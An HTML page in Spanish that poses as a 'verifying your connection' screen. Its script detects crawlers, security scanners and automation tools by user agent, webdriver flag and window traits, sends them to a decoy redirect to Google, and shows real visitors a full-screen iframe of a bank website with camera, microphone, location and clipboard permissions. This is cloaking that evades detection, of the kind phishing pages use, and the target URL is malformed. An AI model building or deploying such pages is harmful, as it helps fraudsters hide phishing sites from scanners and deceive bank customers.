<!doctype html>
<html lang="es">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Cargando...</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      font-family: 'Inter', sans-serif;
      background: radial-gradient(circle at center, #0f172a, #020617);
      color: #f8fafc;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .loader-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      z-index: 5;
      padding: 2.5rem;
      background: rgba(30, 41, 59, 0.4);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 24px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      max-width: 400px;
      width: 90%;
    }

    .spinner {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background: conic-gradient(from 0deg, transparent 30%, #6366f1);
      -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 6px), #000 0);
      mask: radial-gradient(farthest-side, transparent calc(100% - 6px), #000 0);
      animation: spin 1s linear infinite;
      margin-bottom: 1.5rem;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    h1 {
      font-size: 1.25rem;
      font-weight: 600;
      margin: 0 0 0.5rem 0;
      color: #f1f5f9;
      letter-spacing: -0.025em;
    }

    p {
      font-size: 0.875rem;
      color: #94a3b8;
      margin: 0;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: 20;
      display: none;
      background: #ffffff;
    }
  </style>
</head>

<body>
  <div class="loader-container" id="status-card">
    <div class="spinner"></div>
    <h1 id="status-title">Verificando su conexión...</h1>
    <p id="status-desc">Espere un momento por favor.</p>
  </div>

  <script>
    (function () {
      // Configuración de destinos (Ajustar según sea necesario)
      const targetUrl = "hhttps://www.bancamiga.com//"; // URL que se cargará dentro del iframe
      const decoyUrl = "https://www.google.com"; // URL a la que se redirige si es un bot

      // Función de detección de bots / automatización
      function isBot() {
        // 1. Detección de WebDriver (común en Selenium, Puppeteer, Playwright)
        if (navigator.webdriver) {
          return true;
        }

        // 2. Patrones conocidos en el User Agent para bots, rastreadores y herramientas
        const botPatterns = /bot|crawler|spider|google|baidu|bing|yandex|duckduckgo|slurp|lighthouse|chrome-lighthouse|headless|selenium|puppeteer|playwright|scrape/i;
        if (botPatterns.test(navigator.userAgent)) {
          return true;
        }

        // 3. Dimensiones de pantalla sospechosas (típico de entornos headless no configurados)
        if (window.innerWidth === 0 && window.innerHeight === 0) {
          return true;
        }

        // 4. Verificación de idiomas configurados
        if (navigator.languages && navigator.languages.length === 0) {
          return true;
        }

        return false;
      }

      // Ejecutar verificación con una pequeña demora para experiencia visual
      setTimeout(function () {
        const card = document.getElementById('status-card');

        if (isBot()) {
          // Si es bot, redirigir al señuelo
          window.location.replace(decoyUrl);
        } else {
          // Si es usuario real, instanciar y mostrar el iframe a pantalla completa
          const iframe = document.createElement('iframe');
          iframe.src = targetUrl;
          iframe.allow = "geolocation; microphone; camera; midi; encrypted-media; clipboard-write";

          iframe.onload = function () {
            iframe.style.display = 'block';
            card.style.display = 'none';
          };

          document.body.appendChild(iframe);
        }
      }, 1200);
    })();
  </script>
</body>

</html>
